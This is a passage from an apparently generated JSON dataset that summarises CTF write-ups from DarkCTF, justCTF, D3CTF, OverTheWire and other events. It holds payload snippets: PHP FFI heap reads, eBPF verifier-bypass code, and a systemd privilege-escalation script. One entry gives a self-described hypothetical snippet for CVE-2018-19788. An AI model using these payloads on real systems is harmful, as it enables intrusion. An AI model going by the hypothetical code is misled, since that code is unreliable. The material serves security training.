            "In scenarios involving PHP FFI (Foreign Function Interface), memory management can be crucial to exploit or prevent vulnerabilities. The use of persistent flags with `FFI:new` for buffer creation leverages the system heap instead of PHP's internal heap, making it subject to system-level heap exploitation techniques. This can be exploited for arbitrary read/write primitives if an overflow vulnerability exists (e.g., via an encryption function), enabling attackers to manipulate heap metadata, such as the Fastbins or Tcache entries in glibc, for malicious purposes such as arbitrary code execution.\n   \nExample payload for arbitrary read, adjusting for specific heap layout:\n```php\n   $x = [];  \n   array_push($x, creatbuf(0x11), creatbuf(0x11), creatbuf(0x11), creatbuf(0x11));  \n   $x[0][0] = 0x333333333333; // Mark chunk with a recognizable pattern  \n   releasestr($x[1]);  \n   releasestr($x[2]);  \n   read($x[0], 299); // Adjust '299' based on the desired offset to read past the buffer \n```"
        ],
        "key": "```c\n#define FFI_LIB \"../crypt.so\"  \n#define FFI_SCOPE \"crypt\"\n\nvoid encrypt(void* in,unsigned int size,unsigned long long key,void* out);  \nvoid decrypt(void* in,unsigned int size,unsigned long long key,void* out);  \n```\n\n```php\nfunction encrypt_impl($in,$blks,$key,$out){  \nif($blks>300) die(\"too many data\");  \n   FFI::scope(\"crypt\")->encrypt($in,$blks,$key,$out);  \n}  \nfunction decrypt_impl($in,$blks,$key,$out){  \nif($blks>300) die(\"too many data\");  \n   FFI::scope(\"crypt\")->decrypt($in,$blks,$key,$out);  \n}  \n```\n\n```php\n   $x = [];  \n   array_push($x,  \n       creatbuf(0x11), // 0x20 sized chunks  \n       creatbuf(0x11),   \n       creatbuf(0x11),   \n       creatbuf(0x11)  \n   );  \n...  \n   releasestr($x[1]);  \n   releasestr($x[2]);  \n   read($x[0], 299);  \n   for ($i = 0; $i < 300; $i++) {  \n       echo $buf2[$i] . \"\\n\";  \n   }  \n```\n\n```php\n   $x = [];  \n   array_push($x,  \n       creatbuf(0x11),   \n       creatbuf(0x11),   \n       creatbuf(0x11),   \n       creatbuf(0x11)  \n   );  \n   ...  \n   for ($i = 0; $i < 4; $i++) {  \n       $x[$i][0] = 0x333333333333; // recognizeable pattern  \n       $x[$i][1] = 0x333333333333;  \n       $x[$i][2] = 0x333333333333;  \n   }  \n  \n   releasestr($x[1]);  \n   releasestr($x[2]);  \n  \n   read($x[0], 299);  \n   echo \"START\\n\";  \n   for ($i = 0; $i < 300; $i++) {  \n       echo $buf2[$i] . \"\\n\";  \n   }  \n   echo \"END\\n\";  \n```"
    },
    {
        "name": "c_maths",
        "write_up": "dataset/raw/c_maths.md",
        "type": "reverse",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 465,
        "max_score": 499,
        "difficulty": 0.9318637274549099,
        "knowledge": [
            "When dealing with CTF challenges that have dynamic values changing based on the current time, ensure to synchronize the attack script's execution with the target's timing mechanism to maintain consistency. This approach is useful if the challenge seed values (such as random numbers) are based on the current time. Automating the process with a tool like GDB can efficiently extract variable values at runtime without manually solving the underlying algorithm.",
            "In reverse engineering challenges where the binary executes a series of comparisons to validate input, using GDB (GNU Debugger) to set breakpoints at the comparison instruction addresses can reveal the expected inputs directly from the program's memory or registers. This technique bypasses the need to understand the program's logic by providing a direct method to find the correct inputs to satisfy the program's conditions for success. This method is particularly effective in scenarios where the inputs are dynamically generated or unknown.\n   - Example commands to use in GDB for extracting values are:\n     - `x/s $rbp-0x95+8` for extracting strings directly from memory.\n     - `p/d $rax` for printing the integer value stored in the `EAX` register that is required for the next input."
        ],
        "key": "```c\ntVar2 = time((time_t *)0x0);  \nsrand((uint)tVar2);\n\nlocal_95[local_20] = '\\0';  \n__isoc99_scanf(\"%[^\\n]%*c\",local_9c);  \n__n = strlen(local_95);  \niVar1 = strncmp(local_95,local_9c,__n);  \nif (iVar1 != 0) {  \n  exit(1);  \n}\n\nlocal_44 = (int)dVar4;  \n__isoc99_scanf(&DAT_00102015,&local_cc);  \nif (local_44 == local_cc) {  \n  system(\"cat small_chunk.txt\");  \n}\n\nlocal_50 = (int)uVar3;  \n__isoc99_scanf(&DAT_00102015,&local_dc);  \ntime(&local_80);  \nlocal_58 = (double)(local_80 - local_78);  \nif ((local_50 != local_dc) || (5.00000000 <= local_58)) {  \n  puts(\"Nothing for u here\");  \n} else {  \n  system(\"cat big_chunk.txt\");  \n}\n```"
    },
    {
        "name": "D0cker",
        "write_up": "dataset/raw/D0cker.md",
        "type": "pwn",
        "competition": [
            "justCTF/2021",
            "https://ctftime.org/event/1050/tasks/"
        ],
        "score": 231,
        "max_score": 500,
        "difficulty": 0.462,
        "knowledge": [
            "When communicating with a Unix socket file in a Docker container, you can use Python to interact with it by opening a socket connection directly to the file. This method is especially useful for scripting complex interactions or when certain utilities like `socat` are not available or insufficient. This approach allows for automated and programmable interactions with services exposed via Unix sockets in containerized environments. \n   \n   Example Python code snippet for connecting to a Unix socket:\n   ```python\n   import socket\n   sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n   sock.connect('/path/to/socket')\n   sock.sendall(b'MESSAGE')\n   response = sock.recv(1024)\n   print(\"Received:\", response.decode())\n   sock.close()\n   ```",
            "To find out specific container-related information from within a Docker container, such as the container ID or details about the file system layers, you can read various files and directories under `/proc` and `/sys`, as well as utilize the `cgroup` information. For container identification, `/proc/self/cgroup` can be used, and for filesystem details, `/proc/mounts` provides insights into the `overlay` filesystem used by Docker. This knowledge allows for the exploration of container environments and understanding Docker's operations at a deeper level.\n\n   Example commands to extract container ID and file system layer path:\n   - Extract container ID:\n     ```bash\n     cat /proc/self/cgroup | head -n1 | cut -d'/' -f3\n     ```\n   - Obtain Docker overlay filesystem layer path:\n     ```bash\n     cat /proc/self/mounts | grep upperdir | cut -d'=' -f2 | cut -d',' -f1\n     ```"
        ],
        "key": "```python\nimport sys  \nimport socket  \nimport time  \nimport subprocess  \nimport re\n\nCONTAINER_ID_REGEX = '[a-z0-9]{64}'\n\nwith open('/proc/self/cgroup') as f:  \n   my_container_id = f.read().splitlines()[0].split('docker/')[1]\n\nprint(\"MY CONTAINER ID: %s\" % my_container_id)\n\ncpuinfo_lines = open('/proc/cpuinfo').read().splitlines()  \ncpumodel_line = next(line for line in cpuinfo_lines if 'model name' in line)  \ncpumodel = cpumodel_line.split(': ')[1].strip()\n\ndef get_container_ids():  \n   data = subprocess.check_output('ls -l /sys/kernel/slab/*/cgroup/',\nshell=True).decode().splitlines()  \n   cgroups = set(line.split('(')[-1][:-1].split(':')[1] for line in data if\n'(' in line and line[-1] == ')')  \n   return cgroups\n\ndef filter_container_ids(iterable):  \n   return [  \n       i for i in iterable if re.match(CONTAINER_ID_REGEX, i)  \n   ]\n\nall_container_ids = filter_container_ids(get_container_ids())\n\ndef attempt(target_id):  \n   sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)  \n   sock.connect('/oracle.sock')\n\n   print(sock.recv(864))  \n   sock.sendall((cpumodel + '\\n').encode())  \n   print(sock.recv(len(b'That was easy :)\\n[Level 2] What is your *container\nid*?\\n')))  \n   sock.sendall((my_container_id + '\\n').encode())  \n   print(sock.recv(500))\n\n   time.sleep(1)  \n   with open('/secret') as f:  \n       secret = f.read()  \n   print(\"READ SECRET: %s\" % secret)  \n   sock.sendall((secret + '\\n').encode())  \n   print(sock.recv(500))\n\n   with open('/proc/self/mounts') as f:  \n       mounts = f.read().splitlines()  \n       upperdir = [i for i in mounts if 'upperdir=' in i][0]  \n       upperdir = upperdir[upperdir.index('upperdir=')+len('upperdir='):]  \n       upperdir = upperdir.split(',')[0]\n\n   path = upperdir+'/secret'  \n   print(\"PATH IS: %s\" % path)\n\n   sock.sendall((path + '\\n').encode())  \n   print(sock.recv(500))\n\n   sock.sendall((target_id + '\\n').encode())  \n   print(sock.recv(500))  \n   sock.sendall((target_id + '\\n').encode())  \n   flag = sock.recv(500)  \n   if b'justCTF' in flag:  \n       print(flag)  \n       sys.exit(0)\n\nfor container_id in all_container_ids:  \n   attempt(container_id)  \n```"
    },
    {
        "name": "d3bpf-v2",
        "write_up": "dataset/raw/d3bpf-v2.md",
        "type": "pwn",
        "competition": [
            "D3CTF/2022",
            "https://ctftime.org/event/1554/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When exploiting stack overflow vulnerabilities in the kernel's eBPF subsystem, manipulating the `len` argument of the `bpf_skb_load_bytes` function allows bypassing the verifier's checks to achieve a stack overflow. This approach exploits the fact that if a register, expected by the verifier to hold a certain value (e.g., 0), can be manipulated at runtime to hold a different value (e.g., 1), it can lead to incorrect security assumptions by the verifier, enabling vulnerabilities like stack overflows. Example manipulation involves using BPF instructions to alter register values subtly to bypass verifier checks, such as performing a right shift operation on a register believed by the verifier to be zero to pass checks, then using it as a length argument for stack overflow.",
            "In kernel exploitation challenges, particularly those involving eBPF, using a crash due to an illegal memory access (like accessing address 0) can indirectly leak kernel addresses, as the resulting \"soft panic\" might print useful address information. This relies on the kernel's behavior when handling crashes caused by eBPF programs, which does not result in a full kernel panic due to the setting of `/proc/sys/kernel/panic_on_oops` to 0 by default, thus allowing address leaks without causing a system reboot. This knowledge can be particularly useful for bypassing Kernel Address Space Layout Randomization (KASLR), by causing a controlled crash and observing the output for address leaks. This technique requires crafting specific eBPF instructions to trigger a crash while maximizing the likelihood of leaking useful information for further exploitation steps."
        ],
        "key": "```c\nstruct bpf_insn oob_test[] = {  \n    trigger_bug(),  \n    BPF_ALU64_IMM(BPF_MUL, EXP_REG, (16 - 8)),  \n    BPF_MOV64_IMM(BPF_REG_2, 0),  \n    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  \n    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),  \n    BPF_MOV64_IMM(BPF_REG_4, 8),  \n    BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),  \n    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),   \n    BPF_EXIT_INSN()  \n};\n```"
    },
    {
        "name": "d3bpf",
        "write_up": "dataset/raw/d3bpf.md",
        "type": "pwn",
        "competition": [
            "D3CTF/2022",
            "https://ctftime.org/event/1554/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When exploiting vulnerabilities in Linux kernel ebpf (especially when `CONFIG_BPF_JIT_ALWAYS_ON` is enabled), leveraging an error in the verifier's judgment can allow the injection of illegal code to achieve privilege escalation. This approach targets a scenario where a patch introduces a vulnerability that misjudges certain conditions, such as misinterpreting an architecture-dependent behavior (e.g., shifting a 64-bit register by an operand greater than the architecture's limit, which can incorrectly set registers to a certain value that differs from the runtime behavior). Exploiting this requires careful crafting of ebpf bytecode that can pass verifier checks yet behaves differently at runtime due to specific architectural characteristics or introduced vulnerabilities in the verifier logic.",
            "To bypass the verifier's range detection for pointer arithmetic in ebpf exploits, a register with a runtime value different from what the verifier determines can be used. This discrepancy allows for manipulations that the verifier cannot accurately predict or detect, enabling the alteration of pointer arithmetic operations that could lead to memory corruption or unauthorized memory access. An example of this can involve adding an arbitrary value to a pointer by first multiplying a \"trusted\" register by any value and then adding or subtracting it to/from a pointer. The verifier might consider the operation safe (e.g., adding zero to the pointer), while in reality, a carefully crafted operation results in significant unintended modifications (e.g., `ptr + arbitrary_val`).\n\n**Example Payload Snippet:**  \n```\n// Bypassing verifier with a register assumed to represent zero\nBPF_MOV64_REG(BPF_REG_0, EXP_REG),  \nBPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),  \nBPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),  \nBPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),  \nBPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),\n```\nThis snippet assumes `EXP_REG` to have a runtime value of 1 but is considered 0 by the verifier due to a vulnerability, thereby facilitating an operation that bypasses the verifier's intended checks and allows executing unintended memory manipulations such as out-of-bounds access or pointer redirection."
        ],
        "key": "```c\ndiff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c  \nindex 37581919e..8e98d4af5 100644  \n--- a/kernel/bpf/verifier.c  \n+++ b/kernel/bpf/verifier.c  \n@@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct\nbpf_verifier_env *env,  \n                       scalar_min_max_lsh(dst_reg, &src_reg);  \n               break;  \n       case BPF_RSH:  \n-               if (umax_val >= insn_bitness) {  \n-                       /* Shifts greater than 31 or 63 are undefined.  \n-                        * This includes shifts by a negative number.  \n-                        */  \n-                       mark_reg_unknown(env, regs, insn->dst_reg);  \n+               if (umin_val >= insn_bitness) {  \n+                       if (alu32)  \n+                               __mark_reg32_known(dst_reg, 0);  \n+                       else  \n+                               __mark_reg_known_zero(dst_reg);  \n                       break;  \n               }  \n               if (alu32)  \n```\n\n```c\n\t\t\tif (isneg)  \n\t\t\t\t*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);  \n\t\t\t*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit - 1);  \n\t\t\t*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);  \n\t\t\t*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);  \n\t\t\t*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);  \n\t\t\t*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);  \n\t\t\tif (issrc) {  \n\t\t\t\t*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,  \n\t\t\t\t\t\t\t off_reg);  \n```\n\n```c\n   BPF_MOV64_REG(BPF_REG_0, EXP_REG),  \n   BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),  \n   BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),  \n   BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),  \n   BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),  \n```\n\n```c\n       BPF_ALU64_IMM(BPF_MUL, EXP_REG, OFFSET_FROM_DATA_TO_PRIVATE_DATA_TOP),  \n       BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),  \n       BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, 0),  \n       BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, 8),  \n       BPF_EXIT_INSN()  \n```\n\n```c\n//kernel/bpf/syscall.c  \n\tif (map->btf) {  \n\t\tinfo.btf_id = btf_obj_id(map->btf);  \n\t\tinfo.btf_key_type_id = map->btf_key_type_id;  \n\t\tinfo.btf_value_type_id = map->btf_value_type_id;  \n\t}  \n```"
    },
    {
        "name": "DaHeck",
        "write_up": "dataset/raw/DaHeck.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": 295,
        "max_score": 500,
        "difficulty": 0.59,
        "knowledge": [
            "When encountering a challenge that involves manipulations with character arrays and arithmetic operations, it is crucial to consider the possibility of reversing these operations. In cases where the challenge involves generating a specific outcome through arithmetic operations on Unicode characters, reverse-engineering the process can unveil the original input. This approach involves identifying the operations (such as subtraction) and then applying the inverse operation (addition in this instance) to retrieve the original characters. This technique is especially applicable in reverse engineering or cryptography challenges where the output is known, but the input needs to be discovered.  \n**Sample approach**: If `output[n] = input[n] - constant[n]` and the goal is to find `input[n]`, the reverse operation would be `input[n] = output[n] + constant[n]`.",
            "The usage of data types that support wrapping around on overflow, such as unsigned integers in programming languages like Python (using numpy's uint16 for instance), can be instrumental in reversing operations that involve underflow or overflow. This method is used to handle cases where operations in the challenge could result in values outside the standard range of the data type (e.g., negative values becoming large positive values due to underflow). In challenges dealing with calculations or transformations on character codes, applying the correct data type to handle overflow or underflow can lead to retrieving the original data values.  \n**Sample payload construction**: `cs += chr(np.uint16(-daheck[i] + heck[i]))` when reversing a character transformation that involves subtraction and potential underflow."
        ],
        "key": "```java\nprivate static boolean check_flag(String s) {  \n    char[] cs = s.toCharArray();  \n    char[] daheck = new char[cs.length];  \n    int n = cs.length ^ daheck.length;  \n    char[] heck = \"001002939948347799120432047441372907443274204020958757273\".toCharArray();\n\n    while (true) {\n        try {  \n            if (heck[n] - cs[n % cs.length] < 0) daheck[n] = (char) (heck[n] - cs[n % cs.length] % 128);  \n            else daheck[n] = (char) (heck[n] - cs[n % cs.length] % 255);\n\n            n++;  \n        } catch (Throwable t) {  \n            break;  \n        }  \n    }\n\n    return \"\\uffc8\\uffbd\\uffce\\uffbc\\uffca\\uffb7\\uffc5\\uffcb\\u0005\\uffc5\\uffd5\\uffc1\\uffff\\uffc1\\uffd8\\uffd1\\uffc4\\uffcb\\u0010\\uffd3\\uffc4\\u0001\\uffbf\\uffbf\\uffd1\\uffc0\\uffc5\\uffbb\\uffd5\\uffbe\\u0003\\uffca\\uffff\\uffda\\uffc3\\u0007\\uffc2\\u0001\\uffd4\\uffc0\\u0004\\uffbe\\uffff\\uffbe\\uffc1\\ufffd\\uffb5\".equals(new String(daheck));  \n}\n```"
    },
    {
        "name": "DamaS",
        "write_up": "dataset/raw/DamaS.md",
        "type": "crypto",
        "competition": [
            "ASIS/2021/Quals",
            "https://ctftime.org/event/1415/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with RSA encryption challenges where the public exponent 'e' seems large in comparison to 'N' and conventional attacks like Weiner's don't work, consider applying the Boneh-Durfee attack with guessed parameters. Initially, this might seem counterintuitive without any hints towards the size of the secret key 'd', but by adjusting parameters such as 'm' and 'delta', it is possible to find a solvable lattice and recover the secret key. This approach requires experimenting with 'm' and 'delta' values until a suitable set is found that enables the attack.",
            "For encryption schemes that involve operations with matrices, especially when the encryption involves polynomials mod N and matrix transformations, decryption can be achieved by utilizing the found private key to invert these operations. Once the private key is recovered, decrypt the ciphertext by reversing the matrix operations and polynomial transformations applied during encryption. This often involves raising matrices to the power of the private key, inverting them, and then applying these transformations in reverse to the ciphertext to recover the original message."
        ],
        "key": "```python\ndef keygen(nbit, l):  \n   p, q = [random_prime(2**nbit - 1) for _ in '01']  \n   e, N = randint(2, p * q - 1), p * q  \n   Zn = Zmod(N)  \n   f, A = rand_poly(l, N), random_matrix(Zn, l)  \n   B = f(A)  \n   phi = (p - 1) * (q - 1)  \n   d = inverse_mod(e, phi)  \n   if e * d % phi == 1:  \n       Q = B ** d  \n       pubkey = (e, N, Q, B)  \n       return pubkey\n```"
    },
    {
        "name": "dangle-me",
        "write_up": "dataset/raw/dangle-me.md",
        "type": "reverse",
        "competition": [
            "pingCTF/2023",
            "https://ctftime.org/event/1987/tasks/"
        ],
        "score": 448,
        "max_score": 448,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with a dangling pointer vulnerability, particularly in scenarios where the function returns a pointer to a locally defined buffer, this can be exploited by forcing the program to enter recursive calls, leading to stack frames generation. Each recursive call pushes the stack closer to the point where arbitrary data can overwrite the return address, thus allowing for a successful redirection of the code flow. This technique can be used to bypass protections like NX (Non-Executable stack) by leveraging Return-oriented Programming (ROP) chains, such as a ret2libc attack, to execute arbitrary code. A general approach to exploit such vulnerabilities includes:\n\n    - Identifying a function that returns a dangling pointer.\n    - Triggering recursive calls to create a scenario where the stack can be controlled or influenced.\n    - Overwriting the return address or other crucial pointers on the stack to redirect execution flow.",
            "In scenarios where Position Independent Executable (PIE) protection is enabled, leaking an address from the binary's memory mapping allows for the resolution of the base address of the binary itself or other loaded binaries like libc. This information can be leveraged to bypass PIE by facilitating the calculation of function or gadget addresses required for a successful exploit. The technique of leaking addresses to resolve base addresses can be universally applied in exploiting binary vulnerabilities under PIE protection. A common strategy involves:\n\n    - Identifying a memory leak vulnerability or a mechanism to print out memory addresses.\n    - Using the leaked addresses to compute the base address of the binary or libc, thus defeating PIE.\n    - Crafting exploits that utilize these resolved addresses for code execution (e.g., building ROP chains, calling system functions).\n\nSample exploitation steps for leaking addresses and bypassing PIE might not include specific payloads due to the dynamic nature of memory addresses and the requirement for context-specific offsets and values. However, the methodology remains applicable across different binaries and challenges."
        ],
        "key": "```c\nchar *choose_random_name()  \n{  \n int random_number;  \n char dest[48824];\n\n // Randomly select a name and copy it to the local buffer 'dest'  \n // ...  \n return dest;  // Returning a pointer to a local variable  \n}  \n\nunsigned __int64 __fastcall game_handler(char *dangling_pointer)  \n{  \n unsigned int random_number;  \n char choice;  \n char *newline_position;\n\n printf(  \n   \"My name is %s and I am your savior...\\n\"  \n   \"[...]\"  \n   \"\\n\"  \n   \"> \",  \n   dangling_pointer);  \n while ( 1 )  \n {  \n   __isoc99_scanf(\" %c\", &choice);  \n   switch ( choice )  \n   {  \n     case '1':  \n       printf(\"My name is %s, dear\\n\", dangling_pointer); // Printing what dangling_pointer points to  \n       goto LABEL_8;  \n     case '2':  \n       puts(&s);  \n       game_handler(dangling_pointer); // Recursive call with the dangling_pointer  \n       return 0;  \n     case '3':  \n       ...    // Printing a random string based on a random number   \n     case '4':  \n       fwrite(\"Hmph! In that case, choose someone better: \", 1uLL, 0x2BuLL, stdout);  \n       getchar();  \n       fgets(dangling_pointer, 258, stdin); // Writing user input to the buffer pointed by dangling_pointer  \n       newline_position = strrchr(dangling_pointer, '\\n');  \n       if ( newline_position )  \n         *newline_position = 0;  \n       goto LABEL_8;  \n     case '5':  \n       return 0;  \n     default:  \nLABEL_8:  \n       printf(\"> \");  \n       break;  \n   }  \n }  \n}  \n```"
    },
    {
        "name": "DarkPearAI",
        "write_up": "dataset/raw/DarkPearAI.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "RITSEC/2018",
            "https://ctftime.org/event/682/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with a challenge involving Diffie-Hellman key exchange, conversion of given string messages into their decimal format is crucial for correctly solving discrete logarithm problems, as the accuracy of these conversions directly impacts the ability to solve for secret values. After conversion, tools such as SageMath can be employed to apply the `discrete_log` function for solving discrete logarithm issues, particularly useful when handling large numbers as in cryptographic challenges.",
            "In scenarios where the challenge relies on deriving a shared secret key through Diffie-Hellman key exchange, and when base (`g`), modulus (`n`), and transformed messages (`m1`, `m2`) are provided, the methodology involves first utilizing discrete logarithms to find the private keys (`a`, `b`). Once these are obtained, the shared secret key can be calculated using the formula `secretkey = pow(g, a*b) % n`. This approach highlights the importance of understanding and applying discrete logarithm techniques in cryptography challenges to decrypt or derive required information."
        ],
        "key": "```python\ndef diffie_hellman_vulnerable(g, n, m1, m2):\n    # Vulnerable to discrete logarithm attack\n    a = discrete_log(n, m1, g)\n    b = discrete_log(n, m2, g)\n    secret_key = pow(g, a * b, n)\n    return secret_key\n\n# Example usage with given values\ng = 3\nn = 371781196966866977144706219746579136461491261\nm1 = 97112112108101112101097114098108117101\nm2 = 100097114107104111114115101097105\n\nsecret_key = diffie_hellman_vulnerable(g, n, m1, m2)\nprint(secret_key)\n```"
    },
    {
        "name": "Dataflow Programming Christmas Edition",
        "write_up": "dataset/raw/Dataflow Programming Christmas Edition.md",
        "type": "reverse",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": 454,
        "max_score": 591,
        "difficulty": 0.7681895093062606,
        "knowledge": [
            "When facing challenges involving custom programming languages or interpreters, especially in reverse engineering tasks, manual code analysis can be crucial. This involves identifying patterns in the code that correspond to operations on inputs or constants that lead to the desired output. If an interpreter or full understanding of the programming logic is too complex or time-consuming to develop, focusing on patterns that relate inputs (such as flag characters) to constants or specific operations can be an effective strategy.",
            "In challenges involving encoded or encrypted strings where the encoding or encryption process is split into blocks or segments (often visible in the challenge code or logic), each block may correspond to operations on individual characters or subsets of the input string. These blocks can often be reverse-engineered independently to reconstruct the original string. Identifying these blocks and understanding their operations (such as arithmetic or bitwise operations) on known values or inputs can allow for the piecemeal decryption or decoding of the input string.\n\nSample payload for reverse engineering through manual analysis (based on the challenge's logic):\n- To reconstruct the flag character at position 2: `flag[2] = chr((10 + 1) * 10) = 'n'`\n- For the flag character at position 9: `flag[9] = chr(204 >> 2) = '3'`"
        ],
        "key": "```  \n17 CLN 19L 27L  \n18 SND_2 19R -  \n19 EQU 20R -  \n20 BRB 26L 30L\n\n21 SND_10 22L -  \n22 CLN 24L 25R  \n23 SND_1 24R -  \n24 ADD 25L -  \n25 MUL 26R -  \n26 EQU 158L -  \n```  \n```  \n90 CLN 92L 98L  \n91 SND_9 92R -  \n92 EQU 93R -  \n93 BRB 97L 101L\n\n94 SND_204 96L -  \n95 SND_2 96R -  \n96 SHR 97R -  \n97 EQU 158L -  \n```"
    },
    {
        "name": "Day 17_ Naughtykit",
        "write_up": "dataset/raw/Day 17_ Naughtykit.md",
        "type": "misc",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "Identifying the operating system and its version can be crucial for exploiting known vulnerabilities. If a system's UID value is abnormally high and runs on a specific OS version, researching CVEs related to these conditions may lead to potential exploit avenues. This knowledge is specifically applicable when dealing with systems that may not have patched known vulnerabilities.",
            "For privilege escalation on systems affected by CVE-2018-19788 and similar vulnerabilities, users can exploit the flaw by crafting a malicious systemd service file that executes desired commands with elevated privileges. This method requires the attacker to have the ability to create and manipulate service files on the vulnerable system.\n\nExample Payload for Privilege Escalation:\n```bash\ncat <<EOF > /home/elf/pwn.sh\n#!/bin/sh\nls -al /root/ > /home/elf/root_dir  \ncat /root/flag > /home/elf/flag  \nEOF\n\nchmod 777 /home/elf/pwn.sh\n\ncat <<EOF > /home/elf/pwn.service  \n[Unit]  \nDescription=pwn  \nAfter=network.target  \n  \n[Service]  \nExecStart=/home/elf/pwn.sh  \nExecReload=/home/elf/pwn.sh  \nRestart=on-failure  \nRuntimeDirectoryMode=0755  \n  \n[Install]  \nWantedBy=multi-user.target  \nAlias=pwn.service  \nEOF\n\nsystemctl enable /home/elf/pwn.service  \nsystemctl start pwn.service\n```"
        ],
        "key": "```c\n// Hypothetical vulnerable code snippet based on CVE-2018-19788\n#include <stdio.h>\n#include <limits.h>\n#include <stdlib.h>\n\nint main() {\n    int uid = 4020181224; // Example UID greater than INT_MAX\n    if (uid < 0) {\n        fprintf(stderr, \"Invalid UID\\n\");\n        exit(EXIT_FAILURE);\n    }\n    printf(\"UID is valid: %d\\n\", uid);\n    // Code that allows execution of privileged commands\n    // without proper validation due to incorrect UID handling\n    return 0;\n}\n```"
    },
    {
        "name": "Day 1_ Vault1",
        "write_up": "dataset/raw/Day 1_ Vault1.md",
        "type": "misc",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving decoding or determining the sequence of operations on a set of elements, consider using a brute-force approach where possible. Automate the computation of each element's state based on given operations or patterns. This can be applied especially when dealing with rotational or cyclical transformation patterns, like the spinning of wheels, where the state of each wheel is changed based on input and might loop over a limited set of states.",
            "When handling networked services, especially those employing protocols like telnet for interaction, consider using asynchronous I/O libraries such as `asyncio` with `telnetlib` or `telnetlib3` in Python. This enables efficient handling of I/O operations, including sending commands and receiving responses without blocking, which is crucial in challenges that require automated, rapid interaction with a service to test various inputs or brute-force a correct sequence of actions."
        ],
        "key": "```python\ndef find_spin(data):\n    pat = re.compile('\\w{20}\\s{40}(\\w{20})\\s{40}\\w{20}\\s{20}\\w\\s{2}\\w\\s{2}\\w\\s{2}')\n    match = re.search(pat,data)\n    if match is None:\n        return '.',[]\n    index = match.end()-9\n    arr = []\n    while 'x' not in data[index:index+9]:\n        if data[index:index+9-1] != data[index-9+1:index] and data[index+1:index+9] != data[index-9:index-1]:\n            arr.append(index)\n        print(index, '<<'+data[index:index+9]+'>>')\n        index = index + 9\n    arr.append(index)\n    arr = [(arr[i+1]-arr[i])//27 for i in range(len(arr)-1)]\n    return match.group(1),arr\n```"
    },
    {
        "name": "Day 22_ Elvish art",
        "write_up": "dataset/raw/Day 22_ Elvish art.md",
        "type": "pwn",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "When constructing shellcode under restricted conditions, such as a limited set of usable characters or byte values, review the available instructions and their opcodes to identify usable instructions. This is especially relevant in scenarios with filters or security mechanisms that block conventional shellcode. For instance, if the character set excludes null bytes or common shellcode bytes, one can manually assemble shellcode using allowed instructions, like `sub`, `inc`, `dec`, and specific register manipulations. This process might involve creative use of arithmetic or logic instructions to construct required memory addresses or data.",
            "For scenarios requiring dynamic modification or self-modification of shellcode, utilize register operations and memory write instructions creatively. If direct insertion of desired shellcode bytes is not possible due to character restrictions, use register operations (`push`, `pop`, `inc`, `dec`) to set register values to desired states, then write these values into the shellcode space in memory. This method is useful when the execution environment or input filtering limits direct control over the shellcode bytes placed into memory. An illustrative part of this approach involves setting a register to zero using `pushad` followed by `pop` into the wanted register, then decrementing or incrementing it to the desired byte value and writing this byte into the memory space designated for shellcode execution."
        ],
        "key": "```c\nshellcode = mmap(length=0x100000, prot=RWX);\nwhile (True) {\n    ch = readbyte();\n    if (ch == 0xff) {\n        jmp shellcode;\n    } else if (strchr(ascii_art, ch) != NULL || ch == 0) {\n        append ch to shellcode;\n    } else {\n        print(\"invalid char\");\n        exit;\n    }\n}\n```"
    },
    {
        "name": "Day 24_ Santa's vault 2",
        "write_up": "dataset/raw/Day 24_ Santa's vault 2.md",
        "type": "misc",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
